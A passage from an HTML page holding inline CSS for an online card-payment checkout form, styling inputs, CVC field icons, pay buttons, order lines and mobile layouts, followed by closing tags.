        animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        transform: translate(0);
      }
      input[_ngcontent-ng-c1214304408] {
        height: 55px;
      }
      input[_ngcontent-ng-c1214304408]::placeholder {
        font-weight: 400;
      }
      .rp-content-card-input[_ngcontent-ng-c1214304408] {
        letter-spacing: 1.5px;
      }
      .rp-content-error-text[_ngcontent-ng-c1214304408] {
        font-size: 14px;
        color: #dd636b;
      }
    </style>
    <style>
      .invalid[_ngcontent-ng-c1143301535] input[_ngcontent-ng-c1143301535] {
        background-image: url(red-error-icon.88a4be6ad7c84505.svg);
        background-size: 25px;
        background-position: calc(100% - 10px) 13px;
        background-repeat: no-repeat;
        animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        transform: translate(0);
      }
      input[_ngcontent-ng-c1143301535] {
        height: 55px;
      }
      input[_ngcontent-ng-c1143301535]::placeholder {
        font-weight: 400;
      }
      .rp-content-card-input[_ngcontent-ng-c1143301535] {
        letter-spacing: 1.5px;
      }
      .rp-content-error-text[_ngcontent-ng-c1143301535] {
        font-size: 14px;
        color: #dd636b;
      }
      #frmCCCVC[_ngcontent-ng-c1143301535]:not(:disabled)
        + rp-checkmark-icon[_ngcontent-ng-c1143301535] {
        opacity: 1;
        transition: opacity 0.15s;
      }
      #frmCCCVC[_ngcontent-ng-c1143301535]:not(:disabled):not([readonly]) {
        background: url(https://checkout.reepay.com/cvv-icon.4fac3a4b126e2e26.png)
          no-repeat scroll right;
        background-color: #fff;
        background-size: 50px;
        background-origin: content-box;
      }
      #frmCCCVC[_ngcontent-ng-c1143301535]:not(:disabled):not([readonly])
        + rp-checkmark-icon[_ngcontent-ng-c1143301535] {
        visibility: hidden;
        opacity: 0;
      }
    </style>
    <style>
      [_nghost-ng-c457285165] {
        position: absolute;
        display: flex;
        justify-content: flex-end;
        align-items: center;
        width: auto;
        height: 100%;
        top: 0;
        right: 0;
        padding: 6px 12px;
        pointer-events: none;
        transition: transform 0.1s, opacity 0.1s;
        visibility: hidden;
        transform: translateY(2px);
        opacity: 0;
      }
      .valid [_nghost-ng-c457285165] {
        visibility: visible;
        transform: translateY(0);
        opacity: 1;
      }
      [_nghost-ng-c457285165] svg[_ngcontent-ng-c457285165] {
        width: 24px;
        height: 24px;
      }
      [_nghost-ng-c457285165]
        svg[_ngcontent-ng-c457285165]
        path[_ngcontent-ng-c457285165] {
        fill: var(--rp-inputs-border-valid-color);
      }
    </style>
    <style>
      [_ngcontent-ng-c3716369850]:root {
        --rp-background-color: #ffffff;
        --rp-window-background-color: #efefef;
        --rp-window-subscription-background-color: #ffffff;
        --rp-window-mobile-background-color: #fff;
        --rp-window-header-background-color: #ffffff;
        --rp-window-header-box-shadow-color: #ededed;
        --rp-payment-method-divider-color: #e9ecef;
        --rp-pay-button-color: #ffffff;
        --rp-pay-button-family: rawline, Arial, Sans-serif;
        --rp-pay-button-size: 1rem;
        --rp-pay-button-weight: 600;
        --rp-pay-button-size-mobile: 1rem;
        --rp-pay-button-weight-mobile: 600;
        --rp-enabled-button-color: #0d7253;
        --rp-disabled-button-color: #6a6a6a;
        --rp-labels-color: #212529;
        --rp-labels-family: rawline, Arial, Sans-serif;
        --rp-labels-size: 1rem;
        --rp-labels-weight: 600;
        --rp-labels-size-mobile: 15px;
        --rp-labels-weight-mobile: 600;
        --rp-inputs-standard-text-color: #495057;
        --rp-inputs-standard-text-family: rawline, Arial, Sans-serif;
        --rp-inputs-standard-text-size: 1rem;
        --rp-inputs-standard-text-weight: 500;
        --rp-inputs-standard-text-size-mobile: 1rem;
        --rp-inputs-standard-text-weight-mobile: 500;
        --rp-inputs-placeholder-text-color: #ced4da;
        --rp-inputs-placeholder-text-family: rawline, Arial, Sans-serif;
        --rp-inputs-placeholder-text-size: 1rem;
        --rp-inputs-placeholder-text-weight: 500;
        --rp-inputs-placeholder-text-size-mobile: 1rem;
        --rp-inputs-placeholder-text-weight-mobile: 500;
        --rp-inputs-border-standard-width: 1px;
        --rp-inputs-border-standard-color: #ebf1f6;
        --rp-inputs-border-focused-width: 1px;
        --rp-inputs-border-focused-color: #8cbfe5;
        --rp-inputs-border-valid-width: 2px;
        --rp-inputs-border-valid-color: #0d7253;
        --rp-inputs-border-invalid-width: 2px;
        --rp-inputs-border-invalid-color: #dd636b;
        --rp-enabled-continue-button-color: #124b86;
        --rp-payment-header-background-color: #f8f9fa;
        --rp-payment-method-title-color: #343a40;
        --rp-payment-method-title-family: rawline, Arial, Sans-serif;
        --rp-payment-method-title-size: 18px;
        --rp-payment-method-title-weight: 500;
        --rp-payment-method-title-size-mobile: 18px;
        --rp-payment-method-title-weight-mobile: 500;
        --rp-payment-description-color: #124b86;
        --rp-payment-description-family: rawline, Arial, Sans-serif;
        --rp-payment-description-size: 1rem;
        --rp-payment-description-weight: 500;
        --rp-payment-description-size-mobile: 14px;
        --rp-payment-description-weight-mobile: 500;
        --rp-payment-amount-color: #212529;
        --rp-payment-amount-family: rawline, Arial, Sans-serif;
        --rp-payment-amount-size: 22px;
        --rp-payment-amount-weight: 600;
        --rp-payment-amount-size-mobile: 17px;
        --rp-payment-amount-weight-mobile: 600;
        --rp-order-line-name-color: #212529;
        --rp-order-line-name-family: rawline, Arial, Sans-serif;
        --rp-order-line-name-size: 14px;
        --rp-order-line-name-weight: 600;
        --rp-order-line-name-size-mobile: 14px;
        --rp-order-line-name-weight-mobile: 600;
        --rp-order-line-quantity-color: #124b86;
        --rp-order-line-quantity-family: rawline, Arial, Sans-serif;
        --rp-order-line-quantity-size: 14px;
        --rp-order-line-quantity-weight: 600;
        --rp-order-line-quantity-size-mobile: 14px;
        --rp-order-line-quantity-weight-mobile: 600;
        --rp-order-line-amount-color: #212529;
        --rp-order-line-amount-family: rawline, Arial, Sans-serif;
        --rp-order-line-amount-size: 14px;
        --rp-order-line-amount-weight: 600;
        --rp-order-line-amount-size-mobile: 14px;
        --rp-order-line-amount-weight-mobile: 600;
        --rp-footer-background-color: #ffffff;
        --rp-footer-font-color: #495057;
        --rp-footer-font-family: rawline, Arial, Sans-serif;
        --rp-footer-font-size: 14px;
        --rp-footer-font-weight: 500;
        --rp-footer-font-size-mobile: 14px;
        --rp-footer-font-weight-mobile: 500;
        --rp-box-shadow-color: 0 0 20px #ededed;
        --rp-company-name-color: #212529;
        --rp-company-name-family: rawline, Arial, Sans-serif;
        --rp-company-name-size: 24px;
        --rp-company-name-weight: 300;
        --rp-company-name-size-mobile: 24px;
        --rp-company-name-weight-mobile: 300;
        --rp-company-address-color: #212529;
        --rp-company-address-family: rawline, Arial, Sans-serif;
        --rp-company-address-size: 14px;
        --rp-company-address-weight: 300;
        --rp-company-address-size-mobile: 14px;
        --rp-company-address-weight-mobile: 300;
        --rp-title-color: #212529;
        --rp-title-family: rawline, Arial, Sans-serif;
        --rp-title-size: 18px;
        --rp-title-weight: 500;
        --rp-title-size-mobile: 18px;
        --rp-title-weight-mobile: 500;
        --rp-sub-title-color: #212529;
        --rp-sub-title-family: rawline, Arial, Sans-serif;
        --rp-sub-title-size: 18px;
        --rp-sub-title-weight: 400;
        --rp-sub-title-size-mobile: 18px;
        --rp-sub-title-weight-mobile: 400;
        --rp-terms-line-color: #212529;
        --rp-terms-line-family: rawline, Arial, Sans-serif;
        --rp-terms-line-size: 1rem;
        --rp-terms-line-weight: 400;
        --rp-terms-line-size-mobile: 1rem;
        --rp-terms-line-weight-mobile: 400;
        --rp-pricing-item-title-color: #212529;
        --rp-pricing-item-title-family: rawline, Arial, Sans-serif;
        --rp-pricing-item-title-size: 1rem;
        --rp-pricing-item-title-weight: 500;
        --rp-pricing-item-title-size-mobile: 1rem;
        --rp-pricing-item-title-weight-mobile: 500;
        --rp-pricing-item-row-color: #212529;
        --rp-pricing-item-row-family: rawline, Arial, Sans-serif;
        --rp-pricing-item-row-size: 13px;
        --rp-pricing-item-row-weight: 400;
        --rp-pricing-item-row-size-mobile: 13px;
        --rp-pricing-item-row-weight-mobile: 400;
      }
      .config-background[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-background-color);
      }
      .config-window-background[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-window-background-color);
      }
      .config-window-subscription-background[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-window-subscription-background-color);
      }
      .config-window-header-background[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-window-header-background-color);
      }
      .config-window-header-box-shadow[_ngcontent-ng-c3716369850] {
        box-shadow: 1px -3px 20px var(--rp-window-header-box-shadow-color);
      }
      .config-payment-method-divider[_ngcontent-ng-c3716369850] {
        border-top: 1px solid var(--rp-payment-method-divider-color);
      }
      .config-pay-button[_ngcontent-ng-c3716369850],
      .config-continue-button[_ngcontent-ng-c3716369850] {
        color: var(--rp-pay-button-color);
        font-family: var(--rp-pay-button-family);
        font-size: var(--rp-pay-button-size);
        font-weight: var(--rp-pay-button-weight);
      }
      .config-continue-button[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-enabled-continue-button-color);
      }
      .config-pay-button[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-enabled-button-color);
      }
      .config-pay-button[aria-disabled="true"][_ngcontent-ng-c3716369850],
      .config-continue-button[aria-disabled="true"][_ngcontent-ng-c3716369850] {
        background-color: var(--rp-disabled-button-color);
      }
      .config-label[_ngcontent-ng-c3716369850] {
        color: var(--rp-labels-color);
        font-family: var(--rp-labels-family);
        font-size: var(--rp-labels-size);
        font-weight: var(--rp-labels-weight);
      }
      .config-input[_ngcontent-ng-c3716369850] {
        color: var(--rp-inputs-standard-text-color);
        font-family: var(--rp-inputs-standard-text-family);
        font-size: var(--rp-inputs-standard-text-size);
        font-weight: var(--rp-inputs-standard-text-weight);
        border-color: var(--rp-inputs-border-standard-color);
        border-width: var(--rp-inputs-border-standard-width);
        border-style: solid;
      }
      .card-component-container[_ngcontent-ng-c3716369850]
        .valid[_ngcontent-ng-c3716369850]
        > .config-input[_ngcontent-ng-c3716369850],
      .valid[_ngcontent-ng-c3716369850]
        .config-input[_ngcontent-ng-c3716369850] {
        border-color: var(--rp-inputs-border-valid-color);
        border-width: var(--rp-inputs-border-valid-width);
      }
      .card-component-container[_ngcontent-ng-c3716369850]
        .invalid[_ngcontent-ng-c3716369850]
        > .config-input[_ngcontent-ng-c3716369850],
      .invalid[_ngcontent-ng-c3716369850]
        .config-input[_ngcontent-ng-c3716369850] {
        border-color: var(--rp-inputs-border-invalid-color);
        border-width: var(--rp-inputs-border-invalid-width);
      }
      .config-input[_ngcontent-ng-c3716369850]:focus {
        border-color: var(--rp-inputs-border-focused-color);
        border-width: var(--rp-inputs-border-focused-width);
      }
      .config-input[_ngcontent-ng-c3716369850]::placeholder {
        color: var(--rp-inputs-placeholder-text-color);
        font-family: var(--rp-inputs-placeholder-text-family);
        font-size: var(--rp-inputs-placeholder-text-size);
        font-weight: var(--rp-inputs-placeholder-text-weight);
      }
      .config-payment-method-title[_ngcontent-ng-c3716369850] {
        color: var(--rp-payment-method-title-color);
        font-family: var(--rp-payment-method-title-family);
        font-size: var(--rp-payment-method-title-size);
        font-weight: var(--rp-payment-method-title-weight);
      }
      .config-payment-header.selected[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-payment-header-background-color);
      }
      .config-payment-description[_ngcontent-ng-c3716369850],
      .config-message-container-text[_ngcontent-ng-c3716369850] {
        color: var(--rp-payment-description-color);
        font-family: var(--rp-payment-description-family);
        font-size: var(--rp-payment-description-size);
        font-weight: var(--rp-payment-description-weight);
      }
      .config-payment-amount[_ngcontent-ng-c3716369850] {
        color: var(--rp-payment-amount-color);
        font-family: var(--rp-payment-amount-family);
        font-size: var(--rp-payment-amount-size);
        font-weight: var(--rp-payment-amount-weight);
      }
      .config-order-line-name[_ngcontent-ng-c3716369850] {
        color: var(--rp-order-line-name-color);
        font-family: var(--rp-order-line-name-family);
        font-size: var(--rp-order-line-name-size);
        font-weight: var(--rp-order-line-name-weight);
      }
      .config-order-line-quantity[_ngcontent-ng-c3716369850] {
        color: var(--rp-order-line-quantity-color);
        font-family: var(--rp-order-line-quantity-family);
        font-size: var(--rp-order-line-quantity-size);
        font-weight: var(--rp-order-line-quantity-weight);
      }
      .config-order-line-amount[_ngcontent-ng-c3716369850] {
        color: var(--rp-order-line-amount-color);
        font-family: var(--rp-order-line-amount-family);
        font-size: var(--rp-order-line-amount-size);
        font-weight: var(--rp-order-line-amount-weight);
      }
      .config-payment-footer[_ngcontent-ng-c3716369850] {
        background-color: var(--rp-footer-background-color);
      }
      .config-footer-font[_ngcontent-ng-c3716369850] {
        color: var(--rp-footer-font-color);
        font-family: var(--rp-footer-font-family);
        font-size: var(--rp-footer-font-size);
        font-weight: var(--rp-footer-font-weight);
      }
      .config-box-shadow[_ngcontent-ng-c3716369850] {
        box-shadow: var(--rp-box-shadow-color);
      }
      .config-company-name[_ngcontent-ng-c3716369850] {
        color: var(--rp-company-name-color);
        font-family: var(--rp-company-name-family);
        font-size: var(--rp-company-name-size);
        font-weight: var(--rp-company-name-weight);
      }
      .config-company-address[_ngcontent-ng-c3716369850] {
        color: var(--rp-company-address-color);
        font-family: var(--rp-company-address-family);
        font-size: var(--rp-company-address-size);
        font-weight: var(--rp-company-address-weight);
      }
      .config-title[_ngcontent-ng-c3716369850] {
        color: var(--rp-title-color);
        font-family: var(--rp-title-family);
        font-size: var(--rp-title-size);
        font-weight: var(--rp-title-weight);
      }
      .config-sub-title[_ngcontent-ng-c3716369850] {
        color: var(--rp-sub-title-color);
        font-family: var(--rp-sub-title-family);
        font-size: var(--rp-sub-title-size);
        font-weight: var(--rp-sub-title-weight);
      }
      .config-terms-line[_ngcontent-ng-c3716369850] {
        color: var(--rp-terms-line-color);
        font-family: var(--rp-terms-line-family);
        font-size: var(--rp-terms-line-size);
        font-weight: var(--rp-terms-line-weight);
      }
      .config-pricing-item-title[_ngcontent-ng-c3716369850] {
        color: var(--rp-pricing-item-title-color);
        font-family: var(--rp-pricing-item-title-family);
        font-size: var(--rp-pricing-item-title-size);
        font-weight: var(--rp-pricing-item-title-weight);
      }
      .config-pricing-item-row[_ngcontent-ng-c3716369850] {
        color: var(--rp-pricing-item-row-color);
        font-family: var(--rp-pricing-item-row-family);
        font-size: var(--rp-pricing-item-row-size);
        font-weight: var(--rp-pricing-item-row-weight);
      }
      @media (max-width: 700px) {
        .config-pay-button[_ngcontent-ng-c3716369850],
        .config-continue-button[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-pay-button-size-mobile);
          font-weight: var(--rp-pay-button-weight-mobile);
        }
        .config-label[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-labels-size-mobile);
          font-weight: var(--rp-labels-weight-mobile);
        }
        .config-input[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-inputs-standard-text-size-mobile);
          font-weight: var(--rp-inputs-standard-text-weight-mobile);
        }
        .config-input[_ngcontent-ng-c3716369850]::placeholder {
          font-size: var(--rp-inputs-placeholder-text-size-mobile);
          font-weight: var(--rp-inputs-placeholder-text-weight-mobile);
        }
        .config-footer-font[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-footer-font-size-mobile);
          font-weight: var(--rp-footer-font-weight-mobile);
        }
        .config-window-background.mobile[_ngcontent-ng-c3716369850] {
          background-color: var(--rp-window-mobile-background-color);
        }
        .config-payment-method-title[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-payment-method-title-size-mobile);
          font-weight: var(--rp-payment-method-title-weight-mobile);
        }
        .config-payment-description[_ngcontent-ng-c3716369850],
        .config-message-container-text[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-payment-description-size-mobile);
          font-weight: var(--rp-payment-description-weight-mobile);
        }
        .config-payment-amount[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-payment-amount-size-mobile);
          font-weight: var(--rp-payment-amount-weight-mobile);
        }
        .config-order-line-name[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-order-line-name-size-mobile);
          font-weight: var(--rp-order-line-name-weight-mobile);
        }
        .config-order-line-quantity[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-order-line-quantity-size-mobile);
          font-weight: var(--rp-order-line-quantity-weight-mobile);
        }
        .config-order-line-amount[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-order-line-amount-size-mobile);
          font-weight: var(--rp-order-line-amount-weight-mobile);
        }
        .config-company-name[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-company-name-size-mobile);
          font-weight: var(--rp-company-name-weight-mobile);
        }
        .config-company-address[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-company-address-size-mobile);
          font-weight: var(--rp-company-address-weight-mobile);
        }
        .config-title[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-title-size-mobile);
          font-weight: var(--rp-title-weight-mobile);
        }
        .config-sub-title[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-sub-title-size-mobile);
          font-weight: var(--rp-sub-title-weight-mobile);
        }
        .config-terms-line[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-terms-line-size-mobile);
          font-weight: var(--rp-terms-line-weight-mobile);
        }
        .config-pricing-item-title[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-pricing-item-title-size-mobile);
          font-weight: var(--rp-pricing-item-title-weight-mobile);
        }
        .config-pricing-item-row[_ngcontent-ng-c3716369850] {
          font-size: var(--rp-pricing-item-row-size-mobile);
          font-weight: var(--rp-pricing-item-row-weight-mobile);
        }
      }
      .rp-content-section-cards[_ngcontent-ng-c3716369850] {
        display: inline-block;
        vertical-align: middle;
        text-align: left;
        padding: 0;
        overflow: hidden;
      }
      .rp-content-section-cards[_ngcontent-ng-c3716369850]
        .rp-content-cards-images[_ngcontent-ng-c3716369850] {
        vertical-align: middle;
        text-align: left;
        display: inline-block;
        height: 42px;
        transition: height 0.5s ease-in-out;
        overflow: hidden;
        font-size: 12px;
        width: 100%;
      }
      .rp-content-section-cards[_ngcontent-ng-c3716369850]
        .rp-content-cards-images[_ngcontent-ng-c3716369850]
        img[_ngcontent-ng-c3716369850] {
        display: inline-block;
        width: auto;
        height: 25px;
        margin: 10px 7px 0;
      }
      .rp-content-section-cards[_ngcontent-ng-c3716369850]
        .rp-content-cards-images.rp-long[_ngcontent-ng-c3716369850] {
        width: 100%;
      }
      .rp-content-dots-container[_ngcontent-ng-c3716369850] {
        vertical-align: middle;
        display: inline-block;
        max-width: 30px;
        padding-left: 10px;
        height: 42px;
        cursor: pointer;
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850] {
        top: 18px;
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850],
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850]:before,
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850]:after {
        position: absolute;
        width: 5px;
        height: 5px;
        border-radius: 20px;
        background-color: #868e96;
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850]:before,
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850]:after {
        content: "";
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850]:before {
        right: 9px;
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .rp-content-cards-dot[_ngcontent-ng-c3716369850]:after {
        left: 9px;
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .isActive.rp-content-cards-dot[_ngcontent-ng-c3716369850] {
        height: 3px;
        width: 3px;
        background-color: #adb5bd;
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .isActive.rp-content-cards-dot[_ngcontent-ng-c3716369850]:before {
        width: 12px;
        top: -5px;
        left: 0;
        border-radius: 2px;
        transform: rotate(135deg);
        height: 3px;
        background-color: #adb5bd;
        transition: width 0.3s ease-out;
      }
      .rp-content-dots[_ngcontent-ng-c3716369850]
        .isActive.rp-content-cards-dot[_ngcontent-ng-c3716369850]:after {
        width: 12px;
        top: 5px;
        left: 0;
        border-radius: 2px;
        transform: rotate(46deg);
        height: 3px;
        background-color: #adb5bd;
        transition: width 0.3s ease-out;
      }
      .gray-filter[_ngcontent-ng-c3716369850] {
        filter: grayscale(100%);
        opacity: 0.5;
      }
      #sub-cards-container[_ngcontent-ng-c3716369850]
        .card-images-container[_ngcontent-ng-c3716369850] {
        padding-left: 10px;
        padding-right: 10px;
      }
      #sub-cards-container[_ngcontent-ng-c3716369850]
        .card-image[_ngcontent-ng-c3716369850] {
        display: inline-block;
        height: 25px;
        width: 40px;
        margin: 10px 7px 0;
      }
      .row.mobile[_ngcontent-ng-c3716369850]
        #rp-card-image-btn[_ngcontent-ng-c3716369850] {
        padding: 0;
      }
    </style>
                    </style>     
                    </div>
                  </div>
                </div>
              </div>
            </div>
          
        </div>
        
      </div>
    </div>
    <style data-rc-order="append" rc-util-key="antd-wave"></style>
    
  </body>
</html>
